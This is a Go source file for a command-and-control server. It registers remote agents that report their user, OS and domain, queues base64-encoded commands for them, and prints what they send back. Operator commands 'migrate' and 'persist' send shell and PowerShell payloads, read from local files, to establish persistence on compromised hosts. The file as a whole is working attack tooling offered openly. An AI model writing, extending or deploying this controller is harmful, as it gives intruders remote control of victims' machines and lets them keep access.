package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/hoisie/web"
	"github.com/olekukonko/tablewriter"
)

var POINTER = "C2"
var agent = make(map[string][]string)
var agent_cmd = make(map[string][]string)
var agent_time = make(map[string]time.Time)
var COUNT = 0

type CLIENT struct {
	key    string `json:"KEY"`
	user   string `json:"Name"`
	domain string `json:"Domain"`
	os     string `json:"OS"`
}

func migrate() string {
	b, err := ioutil.ReadFile("migrate.txt")
	if err != nil {
		fmt.Print(err)
	}
	return string(b)
}
func persist() string {
	b, err := ioutil.ReadFile("persist.txt")
	if err != nil {
		fmt.Print(err)
	}
	return string(b)
}
func f_b64Encode(i string) string {
	return base64.StdEncoding.EncodeToString([]byte(i))
}
func f_b64Decode(i string) string {
	d, e := base64.StdEncoding.DecodeString(i)
	if e != nil {
		return ""
	}
	return string(d)
}
func getRegister(ip string, key string, os string, user string, domain string) {
	COUNT += 1
	rand_key := key

	agent[rand_key] = []string{strconv.Itoa(COUNT), ip, user, os, domain}
	agent_cmd[rand_key] = []string{strconv.Itoa(COUNT), ""}
	agent_time[rand_key] = time.Now()

	fmt.Printf("\n %d-New Agent Connected(%s) User: %s, OS: %s, Domain: %s ...\n", COUNT, ip, user, os, domain)
}
func index(ctx *web.Context, val string) string {
	reqBody, _ := ioutil.ReadAll(ctx.Request.Body)
	reqBody_s := string(reqBody)

	result := ""
	reqBody_a := strings.Split(reqBody_s, "::")
	if reqBody_a[0] == "REG" {
		agent_b := f_b64Decode(reqBody_a[1])
		agent_j := []byte(agent_b)
		var dat map[string]interface{}

		if err := json.Unmarshal(agent_j, &dat); err != nil {
			panic(err)
		}
		getRegister(ctx.Request.RemoteAddr, dat["KEY"].(string), dat["OS"].(string), dat["Name"].(string), dat["Domain"].(string))
		result = "OK"

	} else if reqBody_a[0] == "CMD" {
		if _, ok := agent_cmd[reqBody_a[1]]; ok {
			agent_time[reqBody_a[1]] = time.Now()
			result = agent_cmd[reqBody_a[1]][1]
			if len(result) > 2 {
				result = f_b64Encode(result)
				fmt.Printf("\n[~] Get Command %s\n", ctx.Request.RemoteAddr)
			}
		} else {
			result = f_b64Encode("REGISTER")
		}

	} else if reqBody_a[0] == "RES" {
		agent_time[reqBody_a[1]] = time.Now()
		agent_cmd[reqBody_a[1]][1] = ""
		fmt.Print(f_b64Decode(reqBody_a[2]))
	}
	return result
}
func initd(ip string, port string) {
	fmt.Printf("\n[+] Start Server on %s:%s\n", ip, port)

	f, err := os.Create("server.log")
	if err != nil {
		println(err.Error())
		return
	}
	logger := log.New(f, "", log.Ldate|log.Ltime)
	web.Post("/(.*)", index)
	web.SetLogger(logger)
	web.Run(ip + ":" + port)
}
func SetupCloseHandler() {
	c := make(chan os.Signal, 2)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("\r- Ctrl+C pressed in Terminal")
		os.Exit(0)
	}()
}

func main() {
	SetupCloseHandler()

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("-> Enter Port for Listener: ")
	port, _ := reader.ReadString('\n')
	port = strings.Replace(port, "\n", "", -1)
	port = strings.Replace(port, "\r", "", -1)
	go func() {
		initd("0.0.0.0", port)
	}()

	for {
		fmt.Printf(POINTER + "> ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.Replace(cmd, "\n", "", -1)
		cmd = strings.Replace(cmd, "\r", "", -1)
		if cmd == "list" {
			table := tablewriter.NewWriter(os.Stdout)
			table.SetHeader([]string{"ID", "IP", "USER", "OS", "Domain", "Time"})

			for key, element := range agent {
				table.Append([]string{element[0], element[1], element[2], element[3], element[4], time.Now().Sub(agent_time[key]).String()})
			}
			table.Render()
		} else if strings.HasPrefix(cmd, "use") {
			cmd = strings.ReplaceAll(cmd, "use ", "")
			for key, element := range agent {
				if element[0] == cmd {
					POINTER = key
					break
				}

			}
		} else if cmd == "exit" {
			os.Exit(0)

		} else if cmd == "migrate" {
			if _, ok := agent_cmd[POINTER]; ok {
				agent_cmd[POINTER][1] = "SHELL::" + migrate()

			}

		} else if cmd == "persist" {
			if _, ok := agent_cmd[POINTER]; ok {
				agent_cmd[POINTER][1] = "PS1::" + f_b64Encode(persist())

			}

		} else if len(cmd) > 1 {

			if _, ok := agent_cmd[POINTER]; ok {
				agent_cmd[POINTER][1] = cmd

			}

		}
	}
}
